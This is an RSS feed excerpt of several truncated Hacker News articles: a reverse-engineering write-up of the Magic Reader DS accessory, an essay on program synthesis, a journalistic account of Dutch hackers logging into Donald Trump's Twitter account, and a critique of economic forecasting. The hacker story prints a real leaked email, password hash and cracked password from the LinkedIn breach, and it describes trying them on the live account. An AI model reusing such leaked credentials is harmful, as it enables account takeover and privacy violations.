				<p>Juushinden and its Magic Reader were never released outside of Japan. While trading-card games are quite popular in that country, overseas is a different market. Ultimately, the video game and the scanner were one-off, having small and limited impact. Konami's attempt at something new remains a bit of a curiosity in that light. Even though the Magic Reader wasn't wildly successful, there's still a fair bit of knowledge we can gleen from the product. At the very least it's an interesting technical demonstration of how card-game-to-video-game interfaces could have evolved, and that much is worth preserving. Just as well, Juushinden was completely unplayable on any NDS emulator without support for the Magic Reader. Once again, we've got to ensure that such history isn't lost.</p>

				<p><strong>Card Collecting</strong></p>

				<p>Obtaining a Complete-in-Box copy of Juushinden pre-pandemic was relatively straightforward. On places like Yahoo Auctions Japan, it's pretty cheap, generally costing about 900 yen. Like other NDS games with extra hardware, Juushinden comes in a large cardboard box. While the packaging for titles like Mag Kid or Oshare Majo are all the same dimensions, Juushinden's is notably bigger. Inside, players will find the NDS game, the Magic Reader, a deck of 40 cards used as a "Starter Pack" and a folded, semi-glossy playing mat for the card game. None of the contents actually takes up a lot of space, so perhaps the size is just for attracting potential buyers.</p>

				<p><img src="https://shonumi.github.io/articles/mr_2.png" alt="The game"> <img src="https://shonumi.github.io/articles/mr_3.png" alt="Magic Reader"> <img src="https://shonumi.github.io/articles/mr_4.png" alt="Play mat"></p>
				<p>What you'll find inside every complete copy of Juushinden: Ultimate Beast Battlers.</p>

				<p>The Magic Reader itself is a dark gray device that sticks out of the GBA slot. By default, it's designed with the NDS Lite in mind, but it has a removable bit of plastic to better fit the original DS. It has a large bulb at the end where players are supposed to place the card to be read. Other than that, it has a white sticker on the back about the same size as a standard GBA cart label. Internally, the Magic Reader has a bunch of colored cables running to some components, two LEDs and a CCD module.</p>

				<p><img src="https://shonumi.github.io/articles/mr_5.png" alt="PCB shot 1"> <img src="https://shonumi.github.io/articles/mr_6.png" alt="PCB shot 2"></p>
				<p>The innards of the Magic Reader are crowded but colorful.</p>

				<p>When trying to play Juushinden via emulation, the game will immediately complain about not detecting the Magic Reader. Players can't reach the title screen or even see the company logos fade in or out. Without the hardware, the software shuts players out almost instantly. During the initial boot process, Juushinden merely wants to see whether or not the Magic Reader is inserted. This is the "device detection" phase common for many games that use Slot-2 add-ons. The process involves reading values from addresses reserved for the GBA cart. Slot-2 accessories will return special values instead of real ROM data, which is then used for identification. The ID used for the Magic Reader is very simple and summed up in the following psuedo-code:</p>

				<p><code>IF ADDRESS AND 1 THEN:                               </code></p>
				<p><code>    RETURN 0xFB                                      </code></p>
				<p><code>ELSE:                                                </code></p>
				<p><code>    RETURN 0xFF                                      </code></p>

				<p>Emulating that much allows Juushinden to run, granting access to the game's main menu and story mode. From there, things proceed normally until the tutorial asks players to start scanning cards. At this point, the next step to truly reverse-engineering the Magic Reader is to gather data by logging all reads and writes related to it. Input/output registers for many Slot-2 devices are typically located somewhere within the <code>0xA000000::0xAFFFFFF</code> address range. True enough, the logs revealed that the Magic Reader exclusively uses <code>0xA000000</code>. I named this register Magic Reader Control or "MR_CNT" for easier reference. With the read/write data captured, I tried to analyze how the Magic Reader operated. However, it became immediately clear I had no idea what was going on.</p>

				<p><code>READ MR_CNT         </code></p>
				<p><code>WRITE TO MR_CNT 0x42</code></p>
				<p><code>READ MR_CNT         </code></p>
				<p><code>WRITE TO MR_CNT 0x03</code></p>
				<p><code>WRITE TO MR_CNT 0x02</code></p>
				<p><code>WRITE TO MR_CNT 0x02</code></p>
				<p><code>READ MR_CNT         </code></p>
				<p><code>WRITE TO MR_CNT 0x02</code></p>
				<p><code>READ MR_CNT         </code></p>
				<p><code>WRITE TO MR_CNT 0x00</code></p>
				<p><code>WRITE TO MR_CNT 0x03</code></p>
				<p><code>WRITE TO MR_CNT 0x02</code></p>
				<p><code>WRITE TO MR_CNT 0x01</code></p>
				<p><code>WRITE TO MR_CNT 0x00</code></p>
				<p><code>WRITE TO MR_CNT 0x01</code></p>
				<p><code>WRITE TO MR_CNT 0x00</code></p>
				<p><code>...                 </code></p>

				<p>It was obvious that the value <code>0x42</code> was something special, appearing at the very start and nowhere else. The rest of the writes were just 0s, 1s, 2s, and 3s in different combinations. A bunch of reads were scattered here and there. Just staring at the raw numbers didn't help a lot, as there really wasn't any sort of context to examine. I was able to guess that however the NDS communicated with the Magic Reader, it mostly only used Bits 0 and 1 of the MR_CNT register. Beyond that much, I couldn't make out what exactly was happening. I strongly suspected that the NDS was trying to initialize the Magic Reader somehow, as most of the data logged came right after booting Juushinden.</p>

				<p>After peeking at the bytes transfered to and from the device, I decided to search for any relavant datasheets for the Magic Reader. One of the parts inside was labeled as a Sonix SN9P701FG-005. Thankfully there was a nice, detailed PDF available from Sonix themselves. Unfortunately, even with that documentation in hand, I couldn't quite make sense of how it applied to the NDS. The datasheet described a serial interface for sending commands or receiving data from an image processor, but it didn't mention anything about accessing that through a memory-mapped register like MR_CNT. MR_CNT was very likely the method by which the NDS used the SN9P701FG's serial interface, but how?</p>

				<p>To answer that question, I browsed through some of Juushinden's code while it made those reads and writes. Whenever the game read MR_CNT, it only ever checked a single bit. Depending on whether Bit 1 was a "0" or a "1" at certain points, the Magic Reader initialization code seemed to hang or timeout. At the time, I didn't really know what I was doing, but it seemed like a good idea to have GBE+ temporarily fake some responses when reading MR_CNT to allow the game to think the Magic Reader was working. During the card-scanning sequence in the tutorial, reads and writes to the Magic Reader changed as well according to Bit 1 of MR_CNT, and fiddling with those responses lead to a rather interesting bit of programming.</p>

				<p>Juushinden constantly pinged MR_CNT waiting for Bit 1 to become zero. Once that happened, it read from MR_CNT 23 times, constructing a 23-bit number by using the current value of Bit 1. It appeared that Bit 1 of MR_CNT was supposed to go low to signal to the NDS that the Magic Reader will send 23-bits of data. The transfer used one bit at a time, therefore it was likely using the serial interface mentioned in the datasheets. Investigating more game code, I saw this 23-bit number was later compared to several constant values such as <code>0x60FFF8</code>, <code>0x60FFF7</code>, and <code>0x60FFF1</code>. These constants were described in Sonix's PDF as commands from the SN9P701FG to the NDS. Uncovering this information proved a major breakthrough in reverse-engineering the Magic Reader.</p>

				<p>Juushinden's game code was looking for the <code>OIDCmd_PowerOn</code>, <code>OIDCmd_PowerDown</code>, or <code>OIDCmd_SystemReset</code> commands. The Magic Reader responds with that data when the NDS attempts to read the status of the SN9P701FG. The PDF explained how the two-wire interface works during read cycles, so I began to figure out how the NDS used MR_CNT. The first line, SCK (or Serial Clock), drives the serial communications. It's quite analogous to a pumping heart or a piston. SCK needs to continually transition from a HIGH state (1) to a LOW state (0) in order to transfer a bit. The second line, SDIO (or Serial Data In/Out) is the data bit to send or receive depending on the operation.</p>

				<p><img src="https://shonumi.github.io/articles/mr_7.png" alt="Diagram of SCK and SDIO"></p>
				<p>A diagram from the PDF illustrating SCK and SDIO</p>

				<p>Looking at the logs of all MR_CNT writes, I noticed that Bit 0 of that register always moved between HIGH and LOW states, therefore it was obviously SCK. Bit 1 or MR_CNT appeared to be SDIO, as its data was used to construct the 23-bit values returned from the Magic Reader. With this knowledge, I mapped all of the NDS' interactions with MR_CNT to …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://shonumi.github.io/articles/art23.html">https://shonumi.github.io/articles/art23.html</a></em></p>]]>
            </description>
            <link>https://shonumi.github.io/articles/art23.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24522898</guid>
            <pubDate>Fri, 18 Sep 2020 23:33:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why care about Program Synthesis]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24522698">thread link</a>) | @harporoeder
<br/>
September 18, 2020 | https://www.zinkov.com/posts/2019-02-17-why-program-synthesis/ | <a href="https://web.archive.org/web/*/https://www.zinkov.com/posts/2019-02-17-why-program-synthesis/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Program synthesis is now emerging as an exciting new area of research not just in the programming languages community, but also the machine learning community. In this post, I’d like to convince you why this area of study has the potential to solve precisely the kinds of problems existing approaches built around differential programming struggle with.</p>
<h2 id="basics-of-program-synthesis">Basics of Program Synthesis</h2>
<p>To start let’s informally and somewhat formally define what makes something a program synthesis problem. Informally, program synthesis is where given a some language <span>\(\mathcal{L}\)</span> and specification <span>\(\mathcal{S}\)</span> we return a program <span>\(\mathcal{P} \in \mathcal{L}\)</span> which meets that specification.</p>
<p>So what languages (<span>\(\mathcal{L}\)</span>) will we use? In principle, any language can be used. So we can synthesize Python code. In practice, because it is difficult these days to create programs much longer than 20-30 lines of code, we concentrate on domain-specific languages (DSLs). DSLs are languages like SQL, Regexes, or OpenGL shaders. If we are willing to be a bit loose about what defines a language, this can include synthesizing a set of library calls like <a href="https://autopandas.io/">Autopandas</a>. All the matters is we can define a grammar that covers the space of programs we wish to consider.</p>
<pre>   &lt;regex&gt; ::= &lt;term&gt; '|' &lt;regex&gt;
            |  &lt;term&gt;

   &lt;term&gt; ::= { &lt;factor&gt; }

   &lt;factor&gt; ::= &lt;base&gt; { '*' }
             
   &lt;base&gt; ::= &lt;char&gt;
           |  '\' &lt;char&gt;
           |  '(' &lt;regex&gt; ')'  
</pre>
<p><strong>Regex grammar</strong></p>
<p><img src="https://www.zinkov.com/images/grammar_graphics.png"></p>
<p>What do we mean by a specification (<span>\(\mathcal{S}\)</span>)?</p>
<p>This can actually be a wide variety of things. <span>\(\mathcal{S}\)</span> can be in particular order one or more of the following:</p>
<ul>
<li>A formal specification of the problem including things like theorems that must be proved along with other formal verification steps.</li>
<li>A set of input/output examples</li>
<li>A set of unit tests and <a href="https://hypothesis.works/articles/what-is-property-based-testing/">property-based</a> tests</li>
<li>A natural language description of the problem</li>
<li>A set of execution traces of the desired program</li>
<li>A sketch of a program where we have a partial program and some blanks we would like to fill in</li>
<li>A correct but inefficient implementation of the desire program</li>
</ul>
<p>While not strictly necessary, we may also have some side information like:</p>
<ul>
<li>Similar but incorrect programs</li>
<li>A set of other programs in <span>\(\mathcal{L}\)</span></li>
</ul>
<p>If we restrict ourselves to a specification that consists of input/output examples and a language of pure functions we get something pretty similar to supervised machine learning. But because the specification can be much richer we actually tackle problems that are hard to pose in a way amendable to traditional machine learning algorithms.</p>
<h2 id="program-synthesis-is-good-for">Program synthesis is good for</h2>
<h3 id="introduction">Introduction</h3>
<p>Now while it is a nice generic formalism that isn’t very compelling if there aren’t problems that benefit from being posed that way. Deep Learning and other optimization methods can now be used to solve a diverse set of problems. What problems tend to easier to solve with program syntheis? As things stand today that main advantages of specifically wanting to generate a program have to do with <em>interpretability</em>, <em>generalisability</em>, <em>verification</em>, <em>combinatorial problems</em>, and <em>output needs to be a program</em>.</p>
<h3 id="interpretability">Interpretability</h3>
<p>Consider the task of automatically grading assignments. How would you go about doing this? You might treat this as a classification task where you find the errors. The challenge with this problem is there can be multiple valid solutions, and the fix for the assignment will depend on which solution you think the student was attempting.</p>
<p>Instead, we can synthesize the correct program but exploring the space of small edits that get us from the incorrect program to a correct program that satisfies an already written specification. These edits can then be presented to the student. This is precisely what the paper <a href="https://arxiv.org/abs/1204.1751">Automated Feedback Generation for Introductory Programming Assignments</a> does on a subset of the Python language, and the paper <a href="https://openreview.net/pdf?id=B1iZRFkwz">Towards Specification-Directed Program Repair</a> which does it for the robot manipulation DSL Karel.</p>
<p>If we didn’t treat this as a program we would have likely ended up with some character edits which as much less interpretable.</p>
<p>This can be seen more strikingly in <a href="https://arxiv.org/abs/1707.09627">Learning to Infer Graphics Programs from Hand-Drawn Images</a> where the program we learn in being a program better communicates the structure in the image.</p>
<p><img src="https://www.zinkov.com/images/infer_graphics.png"></p>
<h3 id="generalisability">Generalisability</h3>
<p>Many deep learning models struggle with generalisibility. They tend not to be very robust to small distribution differences between the training and the testing set as well as being prone to adversarial examples where small imperceptible changes to the input radically change the prediction.</p>
<p>But for many domains if we represent our function as a program it can be made more robust to perturbations of the input like that as can be seen in <a href="https://arxiv.org/abs/1707.09627">Learning to Infer Graphics Programs from Hand-Drawn Images</a></p>
<p>There are actually particular challenges that face the most popular machine learning models which give program synthesis approaches no problems. We know LSTM have trouble with copy and reverse functions as seen in the <a href="https://deepmind.com/blog/article/differentiable-neural-computers">Differentiable Neural computers</a> paper.</p>
<p>LSTM models have trouble generalising to test data longer than training data as can be seen in <a href="https://arxiv.org/abs/1904.11694">Neural Logic Machines</a></p>
<p>In contrast the papers <a href="https://arxiv.org/abs/1704.06611">Making Neural Programming Architectures Generalize via Recursion</a> and <a href="https://arxiv.org/abs/1706.01284">Towards Synthesizing Complex Programs from Input-Output Examples</a> show no issues with either of those tasks.</p>
<p><img src="https://www.zinkov.com/images/genres1.png"></p>
<h3 id="verification">Verification</h3>
<p>Another advantage comes from our output artifact from a program. Neural networks are difficult to formally verify and at present often require major restrictions be placed on the models. In contrast, with programs we can reuse existing infrastructure for verifying deterministic programs. We can thus verify these programs terminate or obey a formal spec. In some domains like robotics we can check if the program has controlability.</p>
<h3 id="problems-with-combinatorial-shape">Problems with combinatorial shape</h3>
<p>Problems that require dealing with graphs, trees, and permutations still remain fairly challenging for existing machine learning algorithms. Programs are a natural representation for manipulating combinatorial structures. <a href="https://arxiv.org/abs/1506.03134">Pointer networks</a>, <a href="https://arxiv.org/abs/1802.08665">Sinkhorn networks</a> along with work with Memory networks and Neural Turing Machines shows that at the moment it is difficult to learn a function that can handle anything beyond toy problems which themselves have trouble generalizing to larger domains.</p>
<h3 id="required-to-use-some-api-output-must-be-program">Required to use some api / output must be program</h3>
<p>And finally, sometimes for one reason or another you need an output that must satisfy some grammar. This might be learning to generate a phone number or a URL. We might have some API we need to conform like if we are trying to generate mobile software that needs to call out to Android or IOS primitives.</p>
<p>We could be using program synthesis for compiler optimization so we must generate a valid program as output. We could be learning to <a href="https://www.sri.inf.ethz.ch/publications/raychev2015predicting">deobfuscate code</a>. Or learning to generate code that would automatically <a href="https://security.ece.cmu.edu/aeg/aeg-current.pdf">hack a system</a>.</p>
<p>Any other approach will need to model the grammar to make output that is acceptable and at that point could also be argued is performing program synthesis.</p>
<h2 id="conclusions">Conclusions</h2>
<p>None of this is meant to say that these problems couldn’t be solved with other methods, but program synthesis has distinct advantages that enables them to solve them particularly well.</p>

</div></div>]]>
            </description>
            <link>https://www.zinkov.com/posts/2019-02-17-why-program-synthesis/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24522698</guid>
            <pubDate>Fri, 18 Sep 2020 23:03:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How three Dutch hackers gained access to Donald Trump’s Twitter account]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24522345">thread link</a>) | @arianvanp
<br/>
September 18, 2020 | https://www.vn.nl/hackers-twitter-trump-english/ | <a href="https://web.archive.org/web/*/https://www.vn.nl/hackers-twitter-trump-english/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>In 2016, three Dutch hackers &nbsp;got hold of Donald Trump’s Twitter password. It wasn’t the launch codes of a nuclear missile, but it came pretty close: one tweet could jeopardize world peace, or prevent Trump from becoming president. How does one handle this amount of responsibility?</p><section id="article-body" data-article-content-element="" data-article-uid="480201" data-restricted="false"><div data-article-content-target=""><p>On October 27, 2016 three middle-aged men were gathered in a room in Hotel Cathedral in the center of Ghent. All three typing away on a laptop.<br> “Uh oh”, one of them said.</p><p>A Twitter login screen displayed the Twitter handle @realdonaldtrump alongside a few password dots. Twitter also asked for an email address verification. ‘Donaldtrump@trump.com’ didn’t work, an error message appeared. And the login attempt failed. Remarkably, in a way that had not been foreseen. The email address was incorrect, the password however, matched!<br> “Did you use a VPN?”<br> “No. I didn’t think the password would work”.</p><blockquote><p>Was this a cyber-attack on an American presidential candidate?</p></blockquote><p>All three of them realized what this meant. The login attempt had been made using the hotel’s Wi-Fi. The Twitter log files now showed that there had been an attempt to log in on the account, from their hotel, using Donald Trump’s legitimate password. And these logfiles would undoubtedly be transferred to the U.S. intelligence services.</p><p>It could be perceived as a cyber-attack on an American presidential candidate.</p><p>Something that could get them into trouble and ruin their reputation, something they could not afford to let happen.</p><h5>Grumpy old hackers</h5><p>I first met with Edwin, Mattijs and Victor in June, in Amsterdam-Noord. “Up the stairs, first door on the left”. I enter a James-Bond-like setting, a room with high windows and a view of the IJ river, a dock with a drilling tower and a Russian polar ship. The three men are sitting at a large conference table. On the table, a few bottles of Club-Mate, the hacker’s preferred beverage.</p><p>It is immediately noticeable that the three of them are close. They have some resemblance to members of a rock band. Victor the talkative guitarist, Mattijs the thoughtful bass player and Edwin the grumpy drummer, who occasionally intervenes when the conversation tends to stray. All three are members of the GGOH – <em>The Guild of Grumpy Old Hackers</em>. Their <a href="http://ggoh.info/">website</a> displays an image with eight pirates and a bitcoin address. “No one has ever transferred a single bitcoin to us, though”.</p><p>The GGOH has about ten members: ‘Elite’ older hackers. Everyone has their own specialism. They do things the police or the army won’t or can’t do. They carry information they can’t ever share. They have decent day time jobs. Large corporates hire Edwin and Mattijs to help them with their information security. Victor is employed by a government agency. At night, however – they run ‘projects’. They love algorithms and the law, because where there are rules, mistakes happen. “Loopholes. Forgotten things.” says Edwin, “Such as the fact that churches have access to the municipal personal records database. Somewhat weird. The kind of thing that will trigger us to start a church of our own.”</p><blockquote><p>“Yes, the three of us could immobilize the country. And so could you. By yourself.”</p></blockquote><p>They aim to locate these mistakes before criminals, spies and terrorists do. And while doing so, they come across the craziest things. Such as bridges that can be opened via the internet, telescopic traffic bollards that can rise from the pavement using a laptop and pension funds that can be accessed with very limited difficulty. They are very careful to not mention specific examples. Mainly because of signed confidentiality agreements with clients. But also to not give others any ideas. “Yes, the three of us can immobilize the country”, says Mattijs, “but so can you, by yourself”.</p><p>In order to securely exchange information with colleagues working in information security, they attend hacker conferences such as BlackHat and DEF CON in Las Vegas, BruCON in Ghent and the Chaos Communication Congress in Leipzig, where I first heard about their story. “Dutch hackers hacked Trump’s Twitter account just before the 2016 elections”, someone there said.</p><p>Within a small bubble of the hacker community it was known who they were. And after a few months of strong persistence, the grumpy hackers agreed to speak with me. I was allowed to write up this story, on the sole condition that I would only mention their first names.</p><h5>Digital treasure trove</h5><p>In October 2016, the grumpy hackers attended another hacker conference. One they never miss: BruCON, held in the Aula Academica in Ghent, a nineteenth-century neoclassical building with Corinthian columns and a small lecture hall in the shape of an arena.</p><p>“We normally sit center downstairs, a little towards the back”, says Victor, “We do that mostly for me. I don’t like any hustle and bustle around me, and I also like to keep a little oversight. We listen to the talks and dig around on our machines a little bit in the meantime. But this time we were on the second floor, very high up. On very unpleasant wooden benches. And then there was a talk from someone I personally like very much, but the presentation contained incredibly annoying sheep sounds. Really. Every single slide: mèèh. So then Edwin said, ‘Yo that stolen LinkedIn data file has now been made publicly available’. That’s pretty cool, let’s go check it out”.</p><p>And so, accompanied by sheep chatter, the grumpy old hackers left the auditorium to go take a look at the LinkedIn file.</p><p>Everyone in information security had heard about ‘that LinkedIn database’. A digital treasure trove with 120 million usernames and hashes of passwords (see insert below to this piece). The loot of a digital burglary in 2012. The mastermind was Yevgeni Nikulin. Google his name and you will find his picture near a Lamborghini parked in front of the Basilius Cathedral on the Red Square in Moscow.</p><p>According to the lawsuit documentation now pending against him in the United States, he managed to get LinkedIn employees to click a link in an email and infected their computers with malware. Through these computers Nikulin managed to gain access to the internal LinkedIn network.</p><h5>Dark market</h5><p>Nikulin made a ton of money selling information to people in a secret criminal network. It is no coincidence that shortly after the LinkedIn break-in, Donald Trump’s Twitter account was hacked. On 21 February 2013, song lyrics by rapper Lil’ Wayne appeared on Trump’s Twitter account. Trump, who had ‘only’ two million followers at the time, reacted immediately:</p><p>‘My Twitter has been seriously hacked – and we are looking for the perpetrators’.</p><p>It wasn’t until the summer of 2016 that the LinkedIn file popped up on the black market. For 5 bitcoins – at that time the equivalent of about three thousand euros – it was offered on The RealDeal, a well-known dark market. This seemed very appealing to the grumpy old hackers.</p><p>“When you are responsible for the information security of a large company or a government agency, you will want access to such a database to see if it contains data of people from your own organization. Three thousand euros isn’t much for a database like this. If you only knew how many intelligence services would be willing to pay for this”, says Victor. “However, buying stolen data is a criminal offense. It is illegal, and we wouldn’t ever consider doing that. We’re not keen on financially aiding criminals. Also, the police access the dark markets too. They can identify buyers. It was absolutely out of the question for us to acquire that file”.</p><blockquote><p>Mark Rutte was on that list. So was Mark Zuckerberg.</p></blockquote><p>Security researchers who infiltrated criminal networks got their hands on the database, regardless. Within the information security community, these types of files are shared in order to better test one’s own security. Something that is impossible to do out in the open.</p><p>Edwin was the first to receive a link, which he immediately shared with Mattijs and Victor. They quickly left for the hotel to quietly conduct further research.</p><p>“I instantly found my director’s password in there”, says Victor, “I sent him a brief message, saying ‘look, it’s your password”. Dutch Prime Minister Mark Rutte was on the list. And so was Mark Zuckerberg (‘dadada’ – turned out afterwards that the password for his facebook account was ‘tadada’).</p><h5>‘Ethical hackers’</h5><p>A week and a half prior to the US elections, everyone in the information security domain was talking about Trump’s Twitter account. It was the most wanted target in the world. From hacktivists to foreign intelligence agencies, they were all out for that account. It was therefore very instinctive to check if Donald Trump was also in the database.</p><p>And he was, right there.<br> email: donaldtrump@trump.com<br> password hash: 07b8938319c267dcdb501665220204bbde87bf1d</p><p>Using the program John the Ripper – a tool hackers use to crack hashes – Mattijs identified the password in less than a second: yourefired</p><p>Edwin was typing it in before anyone could say anything.<br> The password was accepted, and as an extra verification step an email address had to be entered.<br> But the entered address was incorrect.</p><p>Edwin almost fell off his chair. It meant that Trump hadn’t changed his password after the 2013 ‘hack’.<br> Which was bad news.</p><blockquote><p>There was no time to waste. If anyone else would now hack Donald Trump’s Twitter account, they were the ones to be potentially blamed.</p></blockquote><p>The grumpy old hackers knew better than anyone that the Twitter administrators would be able to see that they had made a login attempt from their hotel with the correct Donald Trump password. And also that this information would sooner or later be passed on to the U.S. intelligence services. A login attempt on Donald Trump’s Twitter account could be perceived as a cyber-attack on a U.S. presidential candidate.</p><p>So there really was only one option. The grumpy hackers would have to prove that they were real ‘ethical hackers’. In order to demonstrate this in an unambiguous way, however – they would have to, ironically, break into Trump’s account. It would be the …</p></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.vn.nl/hackers-twitter-trump-english/">https://www.vn.nl/hackers-twitter-trump-english/</a></em></p>]]>
            </description>
            <link>https://www.vn.nl/hackers-twitter-trump-english/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24522345</guid>
            <pubDate>Fri, 18 Sep 2020 22:06:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Forecasting Fallacy]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24522322">thread link</a>) | @behoove
<br/>
September 18, 2020 | https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy | <a href="https://web.archive.org/web/*/https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-layout-label="Post Body" data-type="item" data-updated-on="1600438936254" id="item-5f5f85f0973bac65ca48c1f9"><div><div><div data-block-type="2" id="block-4be18d915b0dc68a6cc9"><div><h3>Introduction</h3><p>Marketers are prone to a prediction.</p><p>You’ll find them in the annual tirade of trend decks. In the PowerPoint projections of self-proclaimed prophets. In the feeds of forecasters and futurists.&nbsp;They crop up on every conference stage. They make their mark on every marketing magazine. And they work their way into every white paper.</p><p>To understand the extent of our forecasting fascination, I analysed the websites of three management consultancies looking for predictions with time frames ranging from 2025 to 2050. Whilst one prediction may be published multiple times, the size of the numbers still shocked me.&nbsp;Deloitte’s site makes 6904&nbsp;predictions.&nbsp;McKinsey &amp; Company make 4296. And Boston Consulting Group, 3679.</p><p>In total, these three&nbsp;companies’ websites include just shy of 15,000 predictions stretching out over the next 30 years.</p><p>But it doesn’t stop there.</p><p>My analysis finished in the year 2050 not because the predictions came to an end but because my enthusiasm did.</p><p>Search the sites and you’ll find forecasts stretching all the way to the year 2100. We’re still finding our feet in this century but some, it seems, already understand the next.</p><p>I believe the vast majority of these to be not forecasts but fantasies. Snake oil dressed up as science. Fiction masquerading as fact.</p><p>This article assesses how predictions have performed in five fields. It argues that poor projections have propagated throughout our society and proliferated throughout our industry. It argues that our fixation with forecasts is fundamentally flawed.</p><p>So instead of focussing on the future, let’s take a moment to look at the predictions of the past.&nbsp;Let’s see how our projections panned out.</p><h3>We can’t predict recessions</h3><p>The Economist’s “The World in 2020”, published in late 2019, brings together experts from business, politics and science to fill 150 pages with projections for the year ahead.</p><p>Editor Daniel Franklin&nbsp;<a href="https://theworldin.economist.com/edition/2020/article/17308/world-2020"><span>summarised</span></a>&nbsp;the issue’s predictions on 2020’s economic outlook:&nbsp;</p><blockquote><p>“Banks, especially in Europe, will battle with negative interest rates. America will flirt with recession—but don’t be surprised if disaster fails to strike, and markets revive.”</p></blockquote><p>Just over two months later COVID-19 struck, the world went into lockdown and we fell into one of the largest&nbsp;<a href="https://news.sky.com/story/coronavirus-largest-uk-recession-on-record-official-figures-12047521"><span>recessions</span></a>&nbsp;on record.</p><p>Perhaps this critique is unfair. The Economist wasn’t to know that we were on the precipice of a pandemic.&nbsp;So let’s review our success rate during more stable times.</p><p>Over to the&nbsp;<a href="https://www.ft.com/content/70a2a978-adac-11e7-8076-0a4bdda92ca2"><span>Financial Times</span></a>:</p><blockquote><p>&nbsp;“In the 2001 issue of the International Journal of Forecasting, an economist from the International Monetary Fund, Prakash Loungani, published a survey of the accuracy of economic forecasts throughout the 1990s. He reached two conclusions. The first was that forecasts are all much the same. There was little to choose between those produced by the IMF and the World Bank, and those from private sector forecasters. The second conclusion was that the predictive record of economists was terrible. Loungani wrote: “The record of failure to predict recessions is virtually unblemished.””</p></blockquote><p>It’s hard to overstate the severity of Loungani’s findings. His&nbsp;<a href="https://www.theguardian.com/money/2017/sep/02/economic-forecasting-flawed-science-data"><span>analysis</span></a>&nbsp;revealed that economists had failed to predict 148 of the past 150 recessions. To put it another way, the experts only saw 1.33% of recessions coming.</p><p>Others have pushed their analysis even further.</p><p>Andrew Brigden, Chief Economist at Fathom Consulting,&nbsp;<a href="https://www.bloomberg.com/news/articles/2019-03-28/economists-are-actually-terrible-at-forecasting-recessions"><span>analysed</span></a>&nbsp;the International Monetary Fund’s predictions across 30 years and 194 countries. The research found that only 4 of the 469 downturns had been predicted by the spring of the preceding year. Brigden’s success rate of 0.85% is remarkably consistent with Longani’s.&nbsp;<a href="https://www.fathom-consulting.com/the-economist-who-cried-wolf/"><span>Brigden</span></a>&nbsp;writes:</p><blockquote><p>“Since 1988, the IMF has never forecast a developed economy recession with a lead of anything more than a few months.”</p></blockquote><p>These two studies, and countless others, paint a pretty damning picture of our ability to spot recessions on the horizon.&nbsp;</p><p>It’s clear that our&nbsp;track record of predicting&nbsp;recessions is pretty patchy. But that doesn’t stop us from making more. As a slowdown turns into a downturn, economists rush to reassure by predicting when more stable times will return. But how do they fare?&nbsp;</p><p>That’s the field that we’ll focus on next.</p><h3>We can’t predict GDP</h3><p>On 15&nbsp;September 2008 Lehman Brothers filed for bankruptcy.</p><p>Despite being the largest bankruptcy filing in U.S.&nbsp;history, the&nbsp;government refused to bail out the bank. Global financial stress quickly turned into an international emergency.</p><p>From its New York epicentre,&nbsp;the effects rippled around the world. International trade fell off a cliff. So did industrial production. Unemployment soared and consumer confidence collapsed.</p><p>7 months&nbsp;later, on 22 April 2009, the IMF&nbsp;published its&nbsp;<a href="https://www.imf.org/en/Publications/WEO/Issues/2016/12/31/World-Economic-Outlook-April-2009-Crisis-and-Recovery-22575"><span>World Economic Outlook</span></a>:</p><blockquote><p>“Even with determined steps to return the financial sector to health and continued use of macroeconomic policy levers to support aggregate demand, global activity is projected to contract by 1.3% in 2009. (…) Growth is projected to reemerge in 2010, but at 1.9% it would be sluggish relative to past recoveries.”</p></blockquote><p>These figures did not fare well.</p><p>Global GDP did contract in 2009 but by 0.7%, around half as severe as the forecast. In 2010, growth wasn’t sluggish but soaring. The global economy grew by a whopping 5.1%, two and a half times greater than the 1.9% predicted.&nbsp;</p><p>In an analysis of the IMF predictions by&nbsp;<a href="https://www.brookings.edu/blog/future-development/2020/04/14/the-world-economy-in-2020-the-imf-gets-it-mostly-right/"><span>The Brookings Institute</span></a>, the critique went even further:</p><blockquote><p>“(The IMF) got the numbers for China and India wrong. The numbers for 2010 were way off-target: The U.S. economy ended up growing by 3% instead of the forecasted zero, Germany’s economy by 3.5% instead of shrinking by one and Japan by 4% instead of -0.5%.”</p></blockquote><p>But it isn’t just the IMF. Take The World Bank.</p><p>On 1 January 2010, The&nbsp;World Bank published their&nbsp;<a href="http://documents.worldbank.org/curated/en/115101468337160604/Global-economic-prospects-2010-crisis-finance-and-growth"><span>Global Economic Prospects</span></a>&nbsp;report. With 9 months longer than the IMF, you’d expect their GDP predictions to be much more accurate. But they still missed the mark.</p><p>They predicted global GDP to grow 2.7% but in reality it increased 3.8%. 1.1% out. In China and&nbsp;India, they&nbsp;were 1.3% out. And in Japan they were 2.7% wide of the mark.</p><p>Clearly our GDP predictions are imprecise and imperfect. But that doesn’t stop us from making more. As society starts to stabilise, economists turn their attention to predicting more universal measures. But how do they fare?&nbsp;</p><p>That’s the field that we’ll focus on next.</p><h3>We can’t predict interest rates</h3><p>On&nbsp;14 July 2015, two&nbsp;economics professors,&nbsp;Maurice Obstfeld and Linda Tesar, published an article on the&nbsp;<a href="https://obamawhitehouse.archives.gov/blog/2015/07/14/decline-long-term-interest-rates"><span>White House website</span></a>&nbsp;espousing the importance of interest rates:</p><blockquote><p>“The level of long-term interest rates is of central importance in the macroeconomy. It matters to borrowers looking to start a business or buy a home; lenders evaluating the risk and rewards of extending credit; savers preparing for college or retirement; and policymakers crafting the 